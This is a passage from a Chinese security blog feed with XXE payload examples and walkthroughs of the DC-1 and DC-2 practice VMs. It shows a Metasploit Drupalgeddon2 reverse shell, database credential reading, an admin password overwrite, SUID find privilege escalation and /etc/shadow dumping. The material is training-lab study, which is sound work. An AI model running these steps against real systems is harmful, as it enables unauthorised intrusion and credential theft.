-<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE a [</span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY b <span class="meta-string">&quot;123456&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span>&gt;</span>&amp;b<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"></span><br><span class="line">输出：</span><br><span class="line"><span class="comment">&lt;!-- 123456 --&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p><strong>内部参数实体</strong></p>
-<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE a&gt;</span> [</span><br><span class="line">    <span class="meta">&lt;!ENTITY % b <span class="meta-string">&quot;&lt;!ENTITY b1 &quot;</span>123456<span class="meta-string">&quot;&gt;&quot;</span>&gt;</span></span><br><span class="line">    %b;</span><br><span class="line">]&gt;</span><br><span class="line"><span class="tag">&lt;<span class="name">a</span>&gt;</span>&amp;b1<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"></span><br><span class="line">输出结果：</span><br><span class="line"><span class="comment">&lt;!-- 123456 --&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>参数实体用<code>% name</code>申明，引用时用<code>%name;</code>，只能在DTD中申明，DTD中引用；其余实体直接用<code>name</code>申明，引用时用<code>&amp;name;</code>，只能在DTD中申明，可在xml文档中引用。</p>
-<p><strong>外部实体</strong></p>
-<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE a&gt;</span> [</span><br><span class="line">    <span class="meta">&lt;!ENTITY b <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;php://filter/read=convert.base64-encode/resource=flag.php&quot;</span>&gt;</span></span><br><span class="line">]&gt;</span><br><span class="line"><span class="tag">&lt;<span class="name">a</span>&gt;</span>&amp;b<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"></span><br><span class="line">输出结果：</span><br><span class="line"><span class="comment">&lt;!-- ZmxhZ3tmMTRnXzFzX2hlcmV9 --&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p><strong>外部参数实体</strong></p>
-<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE a&gt;</span> [</span><br><span class="line">    <span class="meta">&lt;!ENTITY % b <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;http://xxx.xxx.xxx.xxx/xml.dtd&quot;</span>&gt;</span></span><br><span class="line">    %b;</span><br><span class="line">]&gt;</span><br><span class="line"><span class="tag">&lt;<span class="name">a</span>&gt;</span>&amp;b1<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"></span><br><span class="line">输出结果：</span><br><span class="line"><span class="comment">&lt;!-- ZmxhZ3tmMTRnXzFzX2hlcmV9 --&gt;</span></span><br></pre></td></tr></table></figure>
-
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!-- http:&#x2F;&#x2F;xxx.xxx.xxx.xxx&#x2F;xml.dtd --&gt;</span><br><span class="line">&lt;!ENTITY b1 SYSTEM &quot;data:&#x2F;&#x2F;text&#x2F;plain;base64,ZmxhZ3tmMTRnXzFzX2hlcmV9&quot;&gt;</span><br></pre></td></tr></table></figure>
-
-<h3 id="三、XXE应用"><a href="#三、XXE应用" class="headerlink" title="三、XXE应用"></a>三、XXE应用</h3>]]></content>
-      <categories>
-        <category>web漏洞</category>
-      </categories>
-  </entry>
-  <entry>
-    <title>DC系列靶机</title>
-    <url>/2021/05/14/DC%E7%B3%BB%E5%88%97%E9%9D%B6%E6%9C%BA/</url>
-    <content><![CDATA[<script src='https://cdn.jsdelivr.net/gh/sviptzk/HexoStaticFile@latest/Hexo/js/mouse_snow.min.js'></script>
-
-<h3 id="DC-1"><a href="#DC-1" class="headerlink" title="DC-1"></a>DC-1</h3><p>kali：192.168.126.128                                                靶机：192.168.126.135</p>
-<p>先<code>arp-scan -l</code>扫一下ip，再用nmap扫端口<code>nmap -v -A 192.168.126.135</code>或<code>nmap -sV -p-192.168.126.135</code></p>
-<blockquote>
-<p>arp-scan命令： 是一个用来进行系统发现的ARP命令行扫描工具（可以发现本地网络中的隐藏设备）。它可以构造并发送ARP请求到指定的IP地址，并且显示返回的任何响应。</p>
-<p>arp-scan 可以显示本地网络中的所有连接设备，即使这些设备有防火墙。设备可以屏蔽ping，但是并不能屏蔽ARP数据包。</p>
-</blockquote>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">//nmap -sV -p- 192.168.126.135</span><br><span class="line">┌──(root💀hack)-[~]</span><br><span class="line">└─# nmap -sV -p- 192.168.126.135</span><br><span class="line">Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-03 11:48 CST</span><br><span class="line">Nmap scan report for 192.168.126.135</span><br><span class="line">Host is up (0.0010s latency).</span><br><span class="line">Not shown: 65531 closed ports</span><br><span class="line">PORT      STATE SERVICE VERSION</span><br><span class="line">22/tcp    open  ssh     OpenSSH 6.0p1 Debian 4+deb7u7 (protocol 2.0)</span><br><span class="line">80/tcp    open  http    Apache httpd 2.2.22 ((Debian))</span><br><span class="line">111/tcp   open  rpcbind 2-4 (RPC #100000)</span><br><span class="line">34271/tcp open  status  1 (RPC #100024)</span><br><span class="line">MAC Address: 00:50:56:22:CC:DD (VMware)</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 17.05 seconds</span><br></pre></td></tr></table></figure>
-
-<p>发现存在web服务，用whatweb扫一下<code>whatweb 192.168.126.135</code>或<code>whatweb -v 192.168.126.135</code>（更详细）</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">┌──(root💀hack)-[~]</span><br><span class="line">└─# whatweb 192.168.126.135 </span><br><span class="line">http://192.168.126.135 [200 OK] Apache[2.2.22], Content-Language[en], Country[RESERVED][ZZ], Drupal, HTTPServer[Debian Linux][Apache/2.2.22 (Debian)], IP[192.168.126.135], JQuery, MetaGenerator[Drupal 7 (http://drupal.org)], PHP[5.4.45-0+deb7u14], PasswordField[pass], Script[text/javascript], Title[Welcome to Drupal Site | Drupal Site], UncommonHeaders[x-generator], X-Powered-By[PHP/5.4.45-0+deb7u14]</span><br></pre></td></tr></table></figure>
-
-<blockquote>
-<p>处理思路：</p>
-<p>​    针对扫描出的开放服务（应用程序）的处理思路：</p>
-<p>​            1、针对版本搜索相关漏洞；</p>
-<p>​             2、针对协议本身；</p>
-</blockquote>
-<p>发现对应cms为Drupal7，直接上msf（msfconsole）搜索drupal的可用洞</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">msf6 &gt; search drupal</span><br><span class="line">                                                                                                                       Matching Modules                                                                                                       ================                                                                                                          #  Name                                           Disclosure Date  Rank       Check  Description                                                                                                                                          </span><br><span class="line">   -  ----                                           ---------------  ----       -----  -----------                        0  exploit/unix/webapp/drupal_coder_exec          2016-07-13       excellent  Yes    Drupal CODER Module Remote Command Execution                                                                                                          1  exploit/unix/webapp/drupal_drupalgeddon2       2018-03-28       excellent  Yes    Drupal Drupalgeddon 2 Forms API Property Injection                                                                                                   </span><br><span class="line">   2  exploit/multi/http/drupal_drupageddon          2014-10-15       excellent  No     Drupal HTTP Parameter Key/Value SQL Injection                                                                                                        </span><br><span class="line">   3  auxiliary/gather/drupal_openid_xxe             2012-10-17       normal     Yes    Drupal OpenID External Entity Injection                                                                                                              </span><br><span class="line">   4  exploit/unix/webapp/drupal_restws_exec         2016-07-13       excellent  Yes    Drupal RESTWS Module Remote PHP Code Execution                                                                                                       </span><br><span class="line">   5  exploit/unix/webapp/drupal_restws_unserialize  2019-02-20       normal     Yes    Drupal RESTful Web Services unserialize() RCE                                                                                                          6  auxiliary/scanner/http/drupal_views_user_enum  2010-07-02       normal     Yes    Drupal Views Module Users Enumeration                                                                                                                7  exploit/unix/webapp/php_xmlrpc_eval            2005-06-29       excellent  Yes    PHP XML-RPC Arbitrary Code Execution                                                                                                                 </span><br><span class="line">                                                                                                                     </span><br><span class="line">Interact with a module by name or index. For example info 7, use 7 or use exploit/unix/webapp/php_xmlrpc_eval </span><br></pre></td></tr></table></figure>
-
-<p>选择时间比较新的利用，这里使用18年对应的那个 </p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">msf6 &gt; use exploit/unix/webapp/drupal_drupalgeddon2 </span><br><span class="line">[*] No payload configured, defaulting to php/meterpreter/reverse_tcp                                                   msf6 exploit(unix/webapp/drupal_drupalgeddon2) &gt; show options                                                           Module options (exploit/unix/webapp/drupal_drupalgeddon2):                                                                                                                                                                                   </span><br><span class="line">   Name         Current Setting  Required  Description                                                                                                                                                                                       </span><br><span class="line">   ----         ---------------  --------  -----------                                                                                                                                                                                       </span><br><span class="line">   DUMP_OUTPUT  false            no        Dump payload command output                                                                                                                                                                       </span><br><span class="line">   PHP_FUNC     passthru         yes       PHP function to execute                                                                                                                                                                           </span><br><span class="line">   Proxies                       no        A proxy chain of format type:host:port[,type:host:port][...]</span><br><span class="line">   RHOSTS                        yes       The target host(s), range CIDR identifier, or hosts file with syntax &#x27;file:&lt;path&gt;&#x27;</span><br><span class="line">   RPORT        80               yes       The target port (TCP)</span><br><span class="line">   SSL          false            no        Negotiate SSL/TLS for outgoing connections</span><br><span class="line">   TARGETURI    /                yes       Path to Drupal install</span><br><span class="line">   VHOST                         no        HTTP server virtual host</span><br><span class="line"></span><br><span class="line">Payload options (php/meterpreter/reverse_tcp):</span><br><span class="line"></span><br><span class="line">   Name   Current Setting  Required  Description</span><br><span class="line">   ----   ---------------  --------  -----------</span><br><span class="line">   LHOST  192.168.126.128  yes       The listen address (an interface may be specified)</span><br><span class="line">   LPORT  4444             yes       The listen port</span><br><span class="line"></span><br><span class="line">Exploit target:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   Automatic (PHP In-Memory)</span><br><span class="line"></span><br><span class="line">msf6 exploit(unix/webapp/drupal_drupalgeddon2) &gt; set rhost 192.168.126.135</span><br><span class="line">rhost =&gt; 192.168.126.135</span><br><span class="line">msf6 exploit(unix/webapp/drupal_drupalgeddon2) &gt; exploit </span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 192.168.126.128:4444 </span><br><span class="line">[*] Executing automatic check (disable AutoCheck to override)</span><br><span class="line">[!] The service is running, but could not be validated.</span><br><span class="line">[*] Sending stage (39282 bytes) to 192.168.126.135</span><br><span class="line">[*] Meterpreter session 1 opened (192.168.126.128:4444 -&gt; 192.168.126.135:40437) at 2021-08-03 11:58:47 +0800</span><br></pre></td></tr></table></figure>
-
-<p><code>rhost对应的是靶机ip</code></p>
-<p>接下来出现<code>meterpreter &gt; </code>说明成功执行了exploit</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#弹出交互式teriminal</span><br><span class="line">python -c &#39;import pty;pty.spawn(&quot;&#x2F;bin&#x2F;bash&quot;)&#39;</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">meterpreter &gt; shell</span><br><span class="line">Process 3485 created.</span><br><span class="line">Channel 0 created.</span><br><span class="line">python -c &#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br><span class="line">www-data@DC-1:/var/www$ </span><br></pre></td></tr></table></figure>
-
-<p>先查看当前目录下的文件</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">www-data@DC-1:/var/www$ ls</span><br><span class="line">ls</span><br><span class="line">LICENSE.txt      flag1.txt    profiles    web.config</span><br><span class="line">COPYRIGHT.txt       MAINTAINERS.txt  includes     robots.txt  xmlrpc.php</span><br><span class="line">INSTALL.mysql.txt   README.txt       index.php    scripts</span><br><span class="line">INSTALL.pgsql.txt   UPGRADE.txt      install.php  sites</span><br><span class="line">INSTALL.sqlite.txt  authorize.php    misc         themes</span><br><span class="line">INSTALL.txt         cron.php         modules      update.php</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p>发现了flag1.txt，cat一下</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">w-data@DC-1:/var/www$ cat flag1.txt</span><br><span class="line">cat flag1.txt</span><br><span class="line">Every good CMS needs a config file - and so do you.</span><br><span class="line">//大概意思就是要找到对应的config文件</span><br></pre></td></tr></table></figure>
-
-<p>利用find命令找一下settings.php</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">www-data@DC-1:/var/www$ find -name &#x27;settings.php&#x27;</span><br><span class="line">find -name &#x27;settings.php&#x27;</span><br><span class="line">./sites/default/settings.php</span><br><span class="line">www-data@DC-1:/var/www$ cat ./sites/default/settings.php</span><br><span class="line">cat ./sites/default/settings.php</span><br><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line"> *</span><br><span class="line"> * flag2</span><br><span class="line"> * Brute force and dictionary attacks aren&#x27;t the</span><br><span class="line"> * only ways to gain access (and you WILL need access).</span><br><span class="line"> * What can you do with these credentials?</span><br><span class="line"> *</span><br><span class="line"> */</span><br><span class="line"></span><br><span class="line"><span class="meta">$</span><span class="bash">databases = array (</span></span><br><span class="line">  &#x27;default&#x27; =&gt; </span><br><span class="line">  array (</span><br><span class="line">    &#x27;default&#x27; =&gt; </span><br><span class="line">    array (</span><br><span class="line">      &#x27;database&#x27; =&gt; &#x27;drupaldb&#x27;,</span><br><span class="line">      &#x27;username&#x27; =&gt; &#x27;dbuser&#x27;,</span><br><span class="line">      &#x27;password&#x27; =&gt; &#x27;R0ck3t&#x27;,</span><br><span class="line">      &#x27;host&#x27; =&gt; &#x27;localhost&#x27;,</span><br><span class="line">      &#x27;port&#x27; =&gt; &#x27;&#x27;,</span><br><span class="line">      &#x27;driver&#x27; =&gt; &#x27;mysql&#x27;,</span><br><span class="line">      &#x27;prefix&#x27; =&gt; &#x27;&#x27;,</span><br><span class="line">    ),</span><br><span class="line">  ),</span><br><span class="line">);</span><br><span class="line">……</span><br></pre></td></tr></table></figure>
-
-<p>在这里发现了flag2，大概意思是<strong>暴力和字典攻击并不是获得访问权限的唯一方法（而且你需要访问权限），你将如何处理这些数据？</strong>在文件中还看到了数据库的相关信息并且给出了一个低权限的账号，先查看一下数据库。</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mysql&gt; show databases;</span><br><span class="line">show databases;</span><br><span class="line">+--------------------+</span><br><span class="line">| Database           |</span><br><span class="line">+--------------------+</span><br><span class="line">| information_schema |</span><br><span class="line">| drupaldb           |</span><br><span class="line">+--------------------+</span><br><span class="line">2 rows in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; use drupaldb</span><br><span class="line">use drupaldb</span><br><span class="line">Reading table information for completion of table and column names</span><br><span class="line">You can turn off this feature to get a quicker startup with -A</span><br><span class="line"></span><br><span class="line">Database changed</span><br><span class="line">mysql&gt; show tables;</span><br><span class="line">show tables;</span><br><span class="line">+-----------------------------+</span><br><span class="line">| Tables_in_drupaldb          |</span><br><span class="line">+-----------------------------+</span><br><span class="line">| ......                      |</span><br><span class="line">| users                       |</span><br><span class="line">| ......                      |</span><br><span class="line">+-----------------------------+</span><br><span class="line">80 rows in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from users;</span><br><span class="line">select * from users;</span><br></pre></td></tr></table></figure>
-
-<table>
-<thead>
-<tr>
-<th>uid</th>
-<th>name</th>
-<th>pass</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>1</td>
-<td>admin</td>
-<td>$S$DxQCTfic1drhqY7jbCf62drw/T204r3is./KmIUKEzlQUpfHx1RQ</td>
-</tr>
-<tr>
-<td>2</td>
-<td>Fred</td>
-<td>$S$DWGrxef6.D0cwB5Ts.GlnLw15chRRWH2s1R3QBwC0EkvBQ/9TCGg</td>
-</tr>
-</tbody></table>
-<p>users表中有两个账户，但是密码经过加密无法查看，可以结合drupal的机密文件来修改密码。</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">www-data@DC-1:/var/www$ cd scripts</span><br><span class="line">cd scripts</span><br><span class="line">www-data@DC-1:/var/www/scripts$ cp -r ../includes ./</span><br><span class="line">cp -r ../includes ./</span><br><span class="line">www-data@DC-1:/var/www/scripts$ ls</span><br><span class="line">ls</span><br><span class="line">code-clean.sh  drupal.sh            generate-d6-content.sh  password-hash.sh</span><br><span class="line">cron-curl.sh   dump-database-d6.sh  generate-d7-content.sh  run-tests.sh</span><br><span class="line">cron-lynx.sh   dump-database-d7.sh  includes                test.script</span><br><span class="line">www-data@DC-1:/var/www/scripts$ ./password-hash.sh t0mr</span><br><span class="line">./password-hash.sh t0mr</span><br><span class="line"></span><br><span class="line">password: t0mr          hash: $S$DXk.TovSUw5QaQCopN17mumoRyldcf.UDXd40tEI5QluWgHqMQmA</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p>接下来去数据库中更新密码</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mysql&gt; update users set pass &#x3D; &#39;$S$DXk.TovSUw5QaQCopN17mumoRyldcf.UDXd40tEI5QluWgHqMQmA&#39; where name &#x3D; &#39;admin&#39;;</span><br><span class="line">&lt;17mumoRyldcf.UDXd40tEI5QluWgHqMQmA&#39; where name &#x3D; &#39;admin&#39;;                   </span><br><span class="line">Query OK, 1 row affected (0.00 sec)</span><br><span class="line">Rows matched: 1  Changed: 1  Warnings: 0</span><br></pre></td></tr></table></figure>
-
-<p>这时候就可以回去登陆了</p>
-<p>在dashboard看到了flag3，内容是：**Special PERMS will help FIND the passwd - but you’ll need to -exec that command to work out how to get what’s in the shadow.**大概意思是告诉我需要怎么找到密码，但是需要exec和shadow。</p>
-<p>点击flag3后，关注点放到passwd文件和shadow文件。Linux为了考虑安全性，用单独的shadow文件存储Linux用户的密码信息，并且只有root用户有权限读取此文件。所以下一步，我们要考虑的是提权了。<br>采用find提权。</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">www-data@DC-1:/var/www/scripts$ touch 123</span><br><span class="line">touch 123</span><br><span class="line">www-data@DC-1:/var/www/scripts$ find / -name 123 -exec &quot;whoami&quot; \;</span><br><span class="line">find / -name 123 -exec &quot;whoami&quot; \;</span><br><span class="line">root</span><br><span class="line">www-data@DC-1:/var/www$ find / -name 123 -exec &quot;/bin/sh&quot; \;</span><br><span class="line">find / -name 123 -exec &quot;/bin/sh&quot; \;</span><br><span class="line"><span class="meta">#</span><span class="bash"> <span class="built_in">cd</span> /root</span></span><br><span class="line">cd /root</span><br><span class="line"><span class="meta">#</span><span class="bash"> </span></span><br></pre></td></tr></table></figure>
-
-<p>提权成功后，查看shadow文件。</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> cat /etc/shadow</span></span><br><span class="line">cat /etc/shadow</span><br><span class="line">root:$6$rhe3rFqk$NwHzwJ4H7abOFOM67.Avwl3j8c05rDVPqTIvWg8k3yWe99pivz/96.K7IqPlbBCmzpokVmn13ZhVyQGrQ4phd/:17955:0:99999:7:::</span><br><span class="line">daemon:*:17946:0:99999:7:::</span><br><span class="line">bin:*:17946:0:99999:7:::</span><br><span class="line">sys:*:17946:0:99999:7:::</span><br><span class="line">sync:*:17946:0:99999:7:::</span><br><span class="line">games:*:17946:0:99999:7:::</span><br><span class="line">man:*:17946:0:99999:7:::</span><br><span class="line">lp:*:17946:0:99999:7:::</span><br><span class="line">mail:*:17946:0:99999:7:::</span><br><span class="line">news:*:17946:0:99999:7:::</span><br><span class="line">uucp:*:17946:0:99999:7:::</span><br><span class="line">proxy:*:17946:0:99999:7:::</span><br><span class="line">www-data:*:17946:0:99999:7:::</span><br><span class="line">backup:*:17946:0:99999:7:::</span><br><span class="line">list:*:17946:0:99999:7:::</span><br><span class="line">irc:*:17946:0:99999:7:::</span><br><span class="line">gnats:*:17946:0:99999:7:::</span><br><span class="line">nobody:*:17946:0:99999:7:::</span><br><span class="line">libuuid:!:17946:0:99999:7:::</span><br><span class="line">Debian-exim:!:17946:0:99999:7:::</span><br><span class="line">statd:*:17946:0:99999:7:::</span><br><span class="line">messagebus:*:17946:0:99999:7:::</span><br><span class="line">sshd:*:17946:0:99999:7:::</span><br><span class="line">mysql:!:17946:0:99999:7:::</span><br><span class="line">flag4:$6$Nk47pS8q$vTXHYXBFqOoZERNGFThbnZfi5LN0ucGZe05VMtMuIFyqYzY/eVbPNMZ7lpfRVc0BYrQ0brAhJoEzoEWCKxVW80:17946:0:99999:7:::</span><br><span class="line"><span class="meta">#</span><span class="bash"> </span></span><br></pre></td></tr></table></figure>
-
-<p>接着看一下密码文件</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> cat /etc/passwd</span></span><br><span class="line">cat /etc/passwd</span><br><span class="line">root:x:0:0:root:/root:/bin/bash</span><br><span class="line">daemon:x:1:1:daemon:/usr/sbin:/bin/sh</span><br><span class="line">bin:x:2:2:bin:/bin:/bin/sh</span><br><span class="line">sys:x:3:3:sys:/dev:/bin/sh</span><br><span class="line">sync:x:4:65534:sync:/bin:/bin/sync</span><br><span class="line">games:x:5:60:games:/usr/games:/bin/sh</span><br><span class="line">man:x:6:12:man:/var/cache/man:/bin/sh</span><br><span class="line">lp:x:7:7:lp:/var/spool/lpd:/bin/sh</span><br><span class="line">mail:x:8:8:mail:/var/mail:/bin/sh</span><br><span class="line">news:x:9:9:news:/var/spool/news:/bin/sh</span><br><span class="line">uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh</span><br><span class="line">proxy:x:13:13:proxy:/bin:/bin/sh</span><br><span class="line">www-data:x:33:33:www-data:/var/www:/bin/sh</span><br><span class="line">backup:x:34:34:backup:/var/backups:/bin/sh</span><br><span class="line">list:x:38:38:Mailing List Manager:/var/list:/bin/sh</span><br><span class="line">irc:x:39:39:ircd:/var/run/ircd:/bin/sh</span><br><span class="line">gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh</span><br><span class="line">nobody:x:65534:65534:nobody:/nonexistent:/bin/sh</span><br><span class="line">libuuid:x:100:101::/var/lib/libuuid:/bin/sh</span><br><span class="line">Debian-exim:x:101:104::/var/spool/exim4:/bin/false</span><br><span class="line">statd:x:102:65534::/var/lib/nfs:/bin/false</span><br><span class="line">messagebus:x:103:107::/var/run/dbus:/bin/false</span><br><span class="line">sshd:x:104:65534::/var/run/sshd:/usr/sbin/nologin</span><br><span class="line">mysql:x:105:109:MySQL Server,,,:/nonexistent:/bin/false</span><br><span class="line">flag4:x:1001:1001:Flag4,,,:/home/flag4:/bin/bash</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p>先去home下查看一下flag4</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> <span class="built_in">cd</span> /home/flag4</span></span><br><span class="line">cd /home/flag4</span><br><span class="line"><span class="meta">#</span><span class="bash"> ls</span></span><br><span class="line">ls</span><br><span class="line">flag4.txt</span><br><span class="line"><span class="meta">#</span><span class="bash"> cat flag4.txt</span></span><br><span class="line">cat flag4.txt</span><br><span class="line">Can you use this same method to find or access the flag in root?</span><br><span class="line"></span><br><span class="line">Probably. But perhaps it&#x27;s not that easy.  Or maybe it is?</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p>提醒要用root查看。</p>
-<p>在shadow中发现flag4是一个账户。可能是ssh账户，不知道咋破解。。看了大佬的文章后知道密码是orange。。。emm其实没啥用，flag4.txt在root文件夹下</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> <span class="built_in">cd</span> /root</span></span><br><span class="line">cd /root</span><br><span class="line"><span class="meta">#</span><span class="bash"> ls</span></span><br><span class="line">ls</span><br><span class="line">thefinalflag.txt</span><br><span class="line"><span class="meta">#</span><span class="bash"> cat the?????????.???</span> </span><br><span class="line">cat the?????????.???</span><br><span class="line">Well done!!!!</span><br><span class="line"></span><br><span class="line">Hopefully you&#x27;ve enjoyed this and learned some new skills.</span><br><span class="line"></span><br><span class="line">You can let me know what you thought of this little journey</span><br><span class="line">by contacting me via Twitter - @DCAU7</span><br></pre></td></tr></table></figure>
-
-<p>DC-1至此就结束了</p>
-<blockquote>
-<p>小结：</p>
-<p>1、进行扫描，找到靶机的ip及其开放的端口</p>
-<p>2、探测开启了什么web服务</p>
-<p>3、查询相关服务的漏洞进行利用，得到可用账户</p>
-<p>4、利用可用账户进入数据库来查看管理员密码或修改密码</p>
-<p>5、反弹shell并提权</p>
-</blockquote>
-<h3 id="DC-2"><a href="#DC-2" class="headerlink" title="DC-2"></a>DC-2</h3><p>靶机ip：192.168.126.136</p>
-<p>先扫一下ip<code>arp-scan -l</code>之后用nmap来扫端口<code>nmap -v -A 192.168.126.136</code>或<code>nmap -sV -p- 192.168.126.136</code>或<code>nmap -sS -Pn -A -p- -n 192.168.126.136</code></p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">└─# nmap -sV -p- 192.168.126.136</span><br><span class="line">Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-04 15:44 CST</span><br><span class="line">Nmap scan report for dc-2 (192.168.126.136)</span><br><span class="line">Host is up (0.0015s latency).</span><br><span class="line">Not shown: 65533 closed ports</span><br><span class="line">PORT     STATE SERVICE VERSION</span><br><span class="line">80/tcp   open  http    Apache httpd 2.4.10 ((Debian))</span><br><span class="line">7744/tcp open  ssh     OpenSSH 6.7p1 Debian 5+deb8u7 (protocol 2.0)</span><br><span class="line">MAC Address: 00:50:56:32:1D:98 (VMware)</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 8.80 seconds</span><br></pre></td></tr></table></figure>
-
-<p>开放了80和7744端口，可以发现，ssh对应的默认22端口关闭了，切换成了7744</p>
-<p><code>whatweb -v 192.168.126.136</code>或<code>whatweb 192.168.126.136</code>查看一下web服务</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">└─# whatweb 192.168.126.136    </span><br><span class="line">http://192.168.126.136 [301 Moved Permanently] Apache[2.4.10], Country[RESERVED][ZZ], HTTPServer[Debian Linux][Apache/2.4.10 (Debian)], IP[192.168.126.136], RedirectLocation[http://dc-2/]</span><br><span class="line">http://dc-2/ [200 OK] Apache[2.4.10], Country[RESERVED][ZZ], HTML5, HTTPServer[Debian Linux][Apache/2.4.10 (Debian)], IP[192.168.126.136], JQuery[1.12.4], MetaGenerator[WordPress 4.7.10], PoweredBy[WordPress], Script[text/javascript], Title[DC-2 &amp;#8211; Just another WordPress site], UncommonHeaders[link], WordPress[4.7.10]</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p>发现是<strong>wordpress</strong></p>
-<blockquote>
-<p>WordPress是一种使用PHP语言和MySQL数据库开发的博客平台</p>
-<p>思路：</p>
-<p>​    根据CMS做进一步操作：</p>
-<p>​        1、成熟的CMS一般自身不会有漏洞，可以关注其插件的问题；</p>
-<p>​        2、尝试得知CMS版本，做进一步的漏洞搜索；</p>
-<p>​        3、搜索相关CMS的测试工具。</p>
-</blockquote>
-<p>尝试访问一下，发现直接访问ip之后url栏出现了域名，且访问不到，判断是域名不解析，在hosts文件中加入对应ip和域名即可</p>
-<p><code>vi /etc/hosts</code>插入👇</p>
-<table>
-<thead>
-<tr>
-<th>192.168.126.136</th>
-<th>dc-2</th>
-</tr>
-</thead>
-</table>
-<p>再次访问即可。</p>
-<p>在网页中发现了flag，点击出现如下内容</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">Flag</span><br><span class="line"></span><br><span class="line">Flag 1:</span><br><span class="line"></span><br><span class="line">Your usual wordlists probably won’t work, so instead, maybe you just need to be cewl.</span><br><span class="line">More passwords is always better, but sometimes you just can’t win them all.</span><br><span class="line">Log in as one to see the next flag.</span><br><span class="line">If you can’t find it, log in as another.</span><br></pre></td></tr></table></figure>
-
-<blockquote>
-<p>cewl，发现是一个kali自带的密码生成工具</p>
-<p>用法可参考<a href="https://www.codercto.com/a/44828.html">https://www.codercto.com/a/44828.html</a></p>
-</blockquote>
-<p>使用<code>cewl -w dc2_passwords.txt http://dc-2</code>通过页面信息生成密码</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">└─# cewl -w dc2_passwords.txt http://dc-2</span><br><span class="line">CeWL 5.4.8 (Inclusion) Robin Wood (robin@digi.ninja) (https://digi.ninja/)</span><br></pre></td></tr></table></figure>
-
-<p>可以用nikto工具扫描网站结构，找到wp-login.php（登录界面）</p>
-<p><code>nikto -h dc-2 -o nikto-dc-2.txt</code></p>
-<blockquote>
-<p>Nikto是一款开源的（GPL）网页服务器扫描器，它可以对网页服务器进行全面的多种扫描，包含超过3300种有潜在危险的文件CGIs；超过625种服务器版本；超过230种特定服务器问题。<br>Nikto是一个Perl语言编写的扫描器。<br>优点：小巧便捷。<br>弱点：功能有限、命令行工具通病，结果不便查看。</p>
-<p>用法参考：<a href="https://zhuanlan.zhihu.com/p/124246499">https://zhuanlan.zhihu.com/p/124246499</a></p>
-</blockquote>
-<p>接下来用wpscan扫一波</p>
-<blockquote>
